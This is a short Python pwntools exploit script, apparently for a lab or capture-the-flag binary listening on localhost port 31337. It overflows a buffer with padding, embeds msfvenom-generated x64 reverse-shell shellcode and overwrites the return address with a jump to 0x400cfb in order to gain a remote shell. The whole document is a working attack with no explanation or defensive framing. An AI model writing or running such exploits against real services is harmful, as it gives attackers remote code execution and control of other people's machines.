#!/usr/bin/env python3

from pwn import *

# Define target ip and port
ip = '127.0.0.1'
port = 31337

# Reverse shell shellcode -> msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '\x00'
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\xc8\xa9\xfb\xbf\x3d"
shellcode += b"\x5f\x62\x57\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
shellcode += b"\xff\xe2\xf4\xa2\x80\xa3\x26\x57\x5d\x3d\x3d\xc9"
shellcode += b"\xf7\xf4\xba\x75\xc8\x2a\xee\xca\xa9\xfa\x04\xfd"
shellcode += b"\xf7\x63\x17\x99\xe1\x72\x59\x57\x4f\x38\x3d\xe2"
shellcode += b"\xf1\xf4\xba\x57\x5c\x3c\x1f\x37\x67\x91\x9e\x65"
shellcode += b"\x50\x67\x22\x3e\xc3\xc0\xe7\xa4\x17\xd9\x78\xaa"
shellcode += b"\xc0\x95\x90\x4e\x37\x62\x04\x80\x20\x1c\xed\x6a"
shellcode += b"\x17\xeb\xb1\xc7\xac\xfb\xbf\x3d\x5f\x62\x57"

# RIP -> RSP
jmp = b"\xfb\x0c\x40\x00" # -> 0x400cfb

# Offset and buffer padding
offset = 120 - len(shellcode)
buffer = b"A" * offset

# Final payload
payload = buffer + shellcode + jmp

# Connection
try:
    with remote(ip,port) as s:
        s.sendline(payload)

except Exception as e:
    print("[!] Error:", e)
    sys.exit(1)
